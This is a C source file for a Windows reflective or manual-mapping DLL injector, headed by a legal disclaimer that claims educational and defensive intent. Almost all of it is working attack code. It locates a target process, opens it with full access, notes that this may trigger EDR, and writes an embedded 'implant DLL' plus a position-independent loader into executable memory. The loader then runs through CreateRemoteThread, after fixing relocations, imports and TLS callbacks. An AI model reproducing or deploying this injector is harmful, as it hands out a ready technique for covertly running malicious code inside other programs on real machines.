/**
 * LEGAL NOTICE APPLIES
 * This project, including all associated source code and documentation, is developed and shared solely for 
 * educational, research, and defensive purposes in the field of cybersecurity. It is intended to be used 
 * exclusively by cybersecurity professionals, researchers, and educators to enhance understanding, develop defensive 
 * strategies, and improve security postures.
 * 
 * Under no circumstances shall this project be used for criminal, unethical, or any other unauthorized activities. 
 * This is meant to serve as a resource for learning and should not be employed for offensive operations or actions 
 * that infringe upon any individual's or organization's rights or privacy.
 * 
 * The author of this project disclaims any responsibility for misuse or illegal application of the material 
 * provided herein. By accessing, studying, or using this project, you acknowledge and agree to use the information 
 * contained within strictly for lawful purposes and in a manner that is consistent with ethical guidelines and applicable 
 * laws and regulations.
 * 
 * USE AT YOUR OWN RISK. If you decide to use this software CONDUCT A THOROUGH INDEPENDENT CODE REVIEW to ensure it meets 
 * your standards. No unofficial third party dependencies are included to minimise attack surface of a supply chain risk.
 * I cannot be held responsible for any problems that arise as a result of executing this, the burden is on the user of the
 * software to validate its safety & integrity. All care has been taken to write safe code.
 * 
 * It is the user's responsibility to comply with all relevant local, state, national, and international laws and regulations 
 * related to cybersecurity and the use of such tools and information. If you are unsure about the legal implications of using 
 * or studying the material provided in this project, please consult with a legal professional before proceeding. Remember, 
 * responsible and ethical behavior is paramount in cybersecurity research and practice. The knowledge and tools shared in 
 * this project are provided in good faith to contribute positively to the cybersecurity community, and I trust they will be 
 * used with the utmost integrity.
 * 
 * */
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include "dll_injector.h"
#include "dll_byte_array.h"

// finds and returns a handle to a process given its name
HANDLE find_process_and_get_handle(char *process_name) {
      
    HANDLE snapshot                 = NULL; 
    HANDLE process_handle           = NULL;
    PROCESSENTRY32 process_entry;
    BOOL process_found              = 0;

    process_entry.dwSize = sizeof(process_entry);

    // snapshot of all processes in the system
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // iterate through the process list and find the process by name
     if (Process32First(snapshot, &process_entry)) {
        do {
            if (!strcmp(process_name, process_entry.szExeFile)) {
                process_found = TRUE;
                break;
            }
        } while (Process32Next(snapshot, &process_entry));
    } else {
        CloseHandle(snapshot);
        return NULL;
    }

    CloseHandle(snapshot);

    if(!process_found) {
        return NULL;
    }

    // open the process with all possible access rights - WARN: may trigger EDR
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry.th32ProcessID);
    if (process_handle == NULL) {
        printf("[i] OpenProcess function call failed.\n");
        return NULL;
    }

    return process_handle;
}

// Adjusts and realigns the PE file within the target process memory
void realign_pe(LDLL_INFO dll_info) {
    PIMAGE_DOS_HEADER dos_header            = NULL;
    PIMAGE_NT_HEADERS nt                    = NULL;
    LPVOID base                             = NULL;
    PIMAGE_IMPORT_DESCRIPTOR import         = NULL;
    PIMAGE_THUNK_DATA original_thunk        = NULL; 
    PIMAGE_THUNK_DATA first_thunk           = NULL;
    PIMAGE_BASE_RELOCATION relocation_block = NULL;
    PIMAGE_TLS_DIRECTORY tls                = NULL;
    PIMAGE_TLS_CALLBACK *callback           = NULL;

    // function pointers for dynamic loading
    BOOL (*dll_entry)(LPVOID, DWORD, LPVOID);
    LPVOID (*load_dll)(LPSTR);
    LPVOID (*get_proc)(LPVOID, LPSTR);

    // set base addresses and function pointers from DLL_INFO struct 
    base = dll_info->base; // base address of the DLL in the target process
    load_dll = dll_info->load_library_a_addr; // pointer to LoadLibraryA in the target process
    get_proc = dll_info->get_process_addr; // pointer to GetProcAddress in the target process

    // access the PE headers of the DLL in the target process
    dos_header = (PIMAGE_DOS_HEADER)base;
    nt = (PIMAGE_NT_HEADERS)(base + dos_header->e_lfanew);

    // address of the DLL's entry point
    dll_entry = base + nt->OptionalHeader.AddressOfEntryPoint;

    // check if base relocation is required (happens if the DLL is loaded at a different address than its preferred one)
    if (!dll_info->base_relocation_required) {
        goto load_import;
    }

// Base Relocation: Adjust addresses in the relocation table
base_relocation:
        // check if relocation table exists
        if (nt->OptionalHeader.DataDirectory[5].VirtualAddress == 0) { 
            // no relocation table found
            goto load_import;
        }

        ULONGLONG *relocation_address = NULL;

        // calculate the difference between the preferred and actual base addresses
        ULONGLONG base_addr_delta = (ULONGLONG)base - nt->OptionalHeader.ImageBase;
        relocation_block = (PIMAGE_BASE_RELOCATION)(base + nt->OptionalHeader.DataDirectory[5].VirtualAddress);
        
        // iterate over the relocation table and adjust addresses
        while (relocation_block->VirtualAddress) {
            LPVOID relocation_target = base + relocation_block->VirtualAddress;
            int nEntry = (relocation_block->SizeOfBlock - sizeof(PIMAGE_BASE_RELOCATION)) / 2;
            PWORD data = (PWORD)((LPVOID)relocation_block + sizeof(PIMAGE_BASE_RELOCATION));
            
            int i;
            for (i = 0; i < nEntry; i++, data++) {
                if ((*data) >> 12 == 10) { // type 10 indicates a 64-bit address
                    relocation_address = (PULONGLONG)(relocation_target + ((*data) &0xfff)); // address to be relocated
                    *relocation_address += base_addr_delta; // do the relocation
                }
            }

            relocation_block = (PIMAGE_BASE_RELOCATION)((LPVOID)relocation_block + relocation_block->SizeOfBlock);

        }

// Load imports: Adjust pointers to imported functions
load_import:
        // check if import table exists
        if (nt->OptionalHeader.DataDirectory[1].VirtualAddress == 0) {
            goto tls_callback;
        }

        // iterate over the import table and resolve addresses
        import = (PIMAGE_IMPORT_DESCRIPTOR)(base + nt->OptionalHeader.DataDirectory[1].VirtualAddress);
        while (import->Name) {
            LPVOID dll = (*load_dll)(base + import->Name);
            original_thunk = (PIMAGE_THUNK_DATA)(base + import->OriginalFirstThunk);
            first_thunk = (PIMAGE_THUNK_DATA)(base + import->FirstThunk);

            if (!import->OriginalFirstThunk) {
                original_thunk = first_thunk;
            }

            while(original_thunk->u1.AddressOfData) {
                if (original_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // import by ordinal
                    *(ULONGLONG *)first_thunk = (ULONGLONG)(*get_proc)(dll, (LPSTR)IMAGE_ORDINAL(original_thunk->u1.Ordinal));
                } else {
                    // import by name
                    PIMAGE_IMPORT_BY_NAME fnm = (PIMAGE_IMPORT_BY_NAME)(base + original_thunk->u1.AddressOfData);
                    *(PULONGLONG)first_thunk = (ULONGLONG)(*get_proc)(dll, fnm->Name);
                }
                original_thunk++;
                first_thunk++;
            }
            import++;
        }

// TLS Callbacks: Call TLS (Thread Local Storage) callbacks if any
tls_callback:
        if(nt->OptionalHeader.DataDirectory[9].VirtualAddress == 0) {
            goto execute_entry_point;
        }

        tls = (PIMAGE_TLS_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[9].VirtualAddress);

        if (tls->AddressOfCallBacks == 0) {
            goto execute_entry_point;
        }

        callback = (PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
        while(*callback) {
            (*callback)(base, DLL_PROCESS_ATTACH, NULL); // call the TLS callback
            callback++;
        }

// Execute Entry Point: Call the DLL's entry
execute_entry_point:
        (*dll_entry)(base, DLL_PROCESS_ATTACH, NULL);
}

int main(int argc, char **argv) {

    char *process_name              = argv[1];
    char *dll_path                  = argv[2];

    HANDLE target_process_handle    = INVALID_HANDLE_VALUE;
    LPVOID local_dll_base           = (LPVOID)dll_data; // DLL data
    LPVOID target_base_addr         = NULL;
    LPVOID injected_memory_base     = NULL;
    PIMAGE_DOS_HEADER dos_header    = NULL;
    PIMAGE_SECTION_HEADER section   = NULL;
    PIMAGE_NT_HEADERS nt            = NULL;
    DWORD func_size                 = 0;
    DLL_INFO dll;

    dos_header = (PIMAGE_DOS_HEADER)local_dll_base;

    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid file.\n");
        return EXIT_FAILURE;
    }

    nt = (PIMAGE_NT_HEADERS)(local_dll_base + dos_header->e_lfanew);
    section = (PIMAGE_SECTION_HEADER)((LPVOID) nt+24+nt->FileHeader.SizeOfOptionalHeader);

    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[-] Not a 64-bit PE, .\n");
        return EXIT_FAILURE;
    }

    /***********************
     * Open target process
     * *********************/

    target_process_handle = find_process_and_get_handle(process_name);
    if (target_process_handle == NULL) {
        printf("[-] Failed to get handle.");
        return EXIT_FAILURE;
    }

    /***********************
     * Allocate memory in target process
     * *********************/
    dll.base_relocation_required = FALSE;

    if ((target_base_addr = VirtualAllocEx(target_process_handle, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
        dll.base_relocation_required = TRUE;

        if ((target_base_addr = VirtualAllocEx(target_process_handle, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
            //printf("[-] Failed to allocate memory into target process.\n");
            return EXIT_FAILURE;
        }
    }

    /***********************
     * Copy in headers
     * *********************/

    WriteProcessMemory(target_process_handle, target_base_addr, local_dll_base, nt->OptionalHeader.SizeOfHeaders, NULL);

    /***********************
     * Copy in sections
     * *********************/

    printf("Number of sections in implant DLL: %d\n", nt->FileHeader.NumberOfSections);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        printf("Copying section into process memory: %s, size: %d\n", section->Name, section->SizeOfRawData);
        WriteProcessMemory(target_process_handle, target_base_addr + section->VirtualAddress, local_dll_base + section->PointerToRawData, section->SizeOfRawData, NULL);
        section++;
    }

    func_size = (DWORD)((ULONGLONG)main-(ULONGLONG)realign_pe);
    dll.base = target_base_addr;
    dll.get_process_addr = GetProcAddress;
    dll.load_library_a_addr = LoadLibraryA;

    // Allocate memory in the virtual address space of the target process.
    // The size of the memory allocated is func_size + sizeof(dll).
    injected_memory_base = VirtualAllocEx(target_process_handle, NULL, func_size + sizeof(dll), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(injected_memory_base == NULL) {
        printf("[-] Failed to allocate memory for PE.\n");
        VirtualFreeEx(target_process_handle, target_base_addr, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // write the dll structure to the beginning of the allocated memory (injected_memory_base)
    WriteProcessMemory(target_process_handle, injected_memory_base, &dll, sizeof(dll), NULL);
    // writes a code segment (realign_pe) into the memory. 
    WriteProcessMemory(target_process_handle, injected_memory_base + sizeof(dll), realign_pe, func_size, NULL);

    // create a thread in the target process, the thread starts executing at the memory location where realign_pe was written 
    if (!CreateRemoteThread(target_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)(injected_memory_base + sizeof(dll)), injected_memory_base, 0, NULL)) {
        printf("[-] Failed to complete.\n");
        return EXIT_FAILURE;
    }

    // gg :)
    return EXIT_SUCCESS;
}